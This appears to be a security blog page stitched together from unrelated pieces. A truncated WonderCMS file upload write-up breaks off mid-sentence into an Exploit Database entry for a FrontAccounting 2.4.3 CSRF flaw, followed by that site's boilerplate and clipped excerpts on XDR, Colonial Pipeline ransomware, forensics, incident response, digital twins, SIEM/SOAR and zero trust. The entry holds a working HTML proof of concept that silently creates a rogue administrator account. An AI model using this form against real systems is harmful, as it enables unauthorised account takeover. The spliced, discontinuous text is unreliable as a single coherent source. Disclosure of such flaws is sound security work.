By- Samrat Das Hi Readers Recently in one of my pentest research, I found a CMS " WonderCMS" hosted in github. Curious to explore its functionalities, I downloaded and set it up in my local system. After fiddling with the source code, I found that it did not have any kind of file upload security mechanism and allowed the user to upload any file type! After reporting it to them, I did not receive any security relevant response, hence decided to publish a blog on this. Title of the Vulnerability:   Arbitrary File Upload Vulnerability Class: Security Misconfiguration Technical Details & Description: The application source code is coded in a way which allows arbitrary file extensions to be uploaded. This leads to uploading of remote shells/ malicious Trojans which can lead to complete system compromise and server takeover. CVE ID allocated :  CVE-2017-14521 Product & Service Introduction: Wonder CMS 2.3.1 WonderCMS is an open source CMS (Content Ma...

# Vendor Homepage: frontaccounting.com
# Version: 2.4.3
# CVE : CVE-2018-7176
# Category: WebApp ERP

1. Description

The application source code is coded in a way which allows malicious
crafted HTML page to be executed directly without any anti csrf
countermeasures.

2. Proof of Concept

1.       Visit the application
2.       Visit the User Permissions Page.
3.        Goto add user, and create a csrf crafted exploit for the same ,
upon hosting it on a server and sending the link to click by victim, it
gets exploited.

Proof of Concept

Steps to Reproduce:

1. Create an HTML Page with the below exploit code:
-->

<html>
 <body>
    <form action="
http://localhost/frontaccounting/admin/users.php?JsHttpRequest=0-xml"
method="POST" enctype="text/plain">
      <input type="hidden" name="show&#95;inactive"
value="&user&#95;id&#61;Newadmin&password&#61;Newadmin&real&#95;name&#61;New&#37;20Admin&phone&#61;&email&#61;&role&#95;id&#61;8&language&#61;C&pos&#61;1&print&#95;profile&#61;&rep&#95;popup&#61;1&ADD&#95;ITEM&#61;Add&#37;20new&&#95;focus&#61;user&#95;id&&#95;modified&#61;0&&#95;confirmed&#61;&&#95;token&#61;Ta6aiT2xqlL2vg8u9aAvagxx&&#95;random&#61;757897&#46;6552143205"
/>
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

<!--
2  This hosted page upon being clicked by an logged in admin user will lead
to creation of a new malicious admin user.

3 POCs and steps:
https://securitywarrior9.blogspot.in/2018/02/cross-site-request-forgery-front.html

4. Solution:

Implement anti csrf token code in state changing http requests and validate
it at server side.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

What is XDR (Extended detection and response) We all know the prominence of EDR solutions. However the latest technology to enter the space is now: extended detection and response (XDR) which is the result of evolution from endpoint detection and response (EDR). XDR can be considered as the upgraded EDR but with further unified capabilities with other security tools as well to provide combined security analysis visibility, highly efficient detection, and a vastly improved correlation, investigation, and response.   Background and reason for developing XDR: EDR served as the baby steps towards the journey of XDR. In every way, EDR solutions did help to provide effective endpoint detection and response integrating a number of threat detection solutions. However, on the bigger picture, the question still remained about the security team’s challenges around the best possible way to leverage combined capabilities around analytics platforms, security information, and event management (SI...

We all know about the recent ransomware attack on Colonial pipeline. With regard to this, let us try to understand what happened exactly: About the firm: The largest refined products pipeline in the US, it is involved in transporting over 100 million gallons of fuel across their corridors. The recent ransomware attack against colonial pipeline's networks led to an emergency declaration in 17 states and the district of Columbia across 5,500 miles of fuel pipeline Let’s understand about Darkside ransomware Darkside is a relatively new ransomware strain that made its first appearance in August 2020. It follows RaaS (ransomware-as-a-service) model. It follows a double extortion trend like: 1.       Threat actors encrypt the user’s data 2.       Exfiltrate the data and threaten to make it public if the ransom demand is not paid. Their ransom demand ranges between $200,000 to $2,000,000. Let’s now understand how the attack ve...

What is digital forensics? A specialized branch of forensic science that works to recover and investigate digital devices in the world of cybercrime. The aim of this work is to identify, preserve, analyze, and document digital evidence in order to present it to the relevant law authorities as and when required. Who is a Digital forensics investigator?  A person who has a mindset to discover evidence and trace back the storyline to solve the case. It can range from discovering:  • How attackers gained access to the network- or the point of breach • Lateral movement on the network- or affected systems discovery • Information stolen or backdoors planted- Corporate Espionage  • Recover data that were attempted for deletion, damage as well as manipulation. Let’s now analyze the different phases across a digital forensics investigation: Phases: 1. First-line incident response The focal point right after a suspected breach /security incident is known as the first respo...

Welcome readers back to my blog. Today we will have a run-through in terms of performing incident response on ransomware breaches. Ransomware as we all know is becoming an increasing menace the world over, many firms keep getting compromised one way or another due to this specialized attack. The most critical factor in handling incident response would range around how effective firms do tackle such incidents. TL; DR: Validate the attack Gather the incident response team Analyze the incident and perform a thorough investigation  Contain the incident Eradicate the malware and its traces Perform post-incident analysis and monitoring Perform a post mortem analysis and prepare the lessons learned  In this part, let’s focus majorly on validation, analysis, containment phases.  Let’s take a look as a refresher for how best to handle such incidents (and also others similar in nature)  1.    Initial Triaging a.      Start with the aim to limit the inf...

  What is digital twin? Digital twin is increasingly becoming popular since 2018, as the virtual replicas of physical assets. Simply said, this buzz word refers to a technology that helps carry out features like device simulation during development, ingestion of real-world data about a physical object or system as inputs and producing the outputs or simulations based on those inputs helping scientists and IT professionals run simulations before actual devices are built and deployed. Digital twin technology has now moved to multiple industries and vastly merging in the Internet of Things, artificial intelligence and data analytics helping augment deployments for peak efficiency and create other what-if scenarios. Via simulation of real object and its interactions with its surroundings, this technology helps provide a more accurate representation of the shape an object than a physical replica. The power of digital twins can be extended to virtually any technology such as clou...

A great matter of debate and confusion I have always seen is the line of difference between SOAR and SIEM along with fact that if you have one, do you still need the other or in conjunction. In order to understand the clarity, let us analyze the details and the concept behind both one by one: 1.       Understanding SIEM SIEM is the abbreviation for the technology platforms which stands for security information and event management used to collect and store security data. This can be related to simple examples including firewalls, intrusion detection systems/ prevention systems etc. This technically helps to aggregate and correlate all of this gathered data by help in analyze date wth focused analytics and machine learning software. 2.       Understanding SOAR SOAR on the other hand is the collective technology involving Security orchestration, automation and response (SOAR), that is intended to help imbibe security operat...

1.     Introduction to zero trust: A more and more raging buzz word in the world of information security, Zero Trust Architecture refers to the “defense in depth” approach of implementing security concepts removing the process of automatically trusting actors and devices integrated in network. Zero trust architecture provides a thorough end to end approach to enterprise resource and data security controls interwoven around identity (person and nonperson entities), credentials, access management, operations, endpoints, hosting environments, and the interconnecting infrastructure. Zero trust leads to ultimately verifying every single component trying to connect to the system before granting access. Relying on fine grained methods such as micro-segmentation and granular perimeter enforcement based on users, zero trust helps to control security over controls such as trusting a user, machine or application for gaining access to a part of the enterprise network.
